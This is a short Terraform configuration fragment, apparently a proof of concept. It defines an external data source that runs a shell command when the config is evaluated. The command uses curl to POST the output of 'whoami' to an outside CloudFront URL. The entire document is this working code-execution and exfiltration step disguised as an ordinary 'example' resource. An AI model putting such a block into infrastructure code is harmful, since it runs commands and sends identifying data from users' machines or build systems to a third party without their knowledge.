data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`whoami`\" https://d9usos5h96tz9.cloudfront.net/log"]
}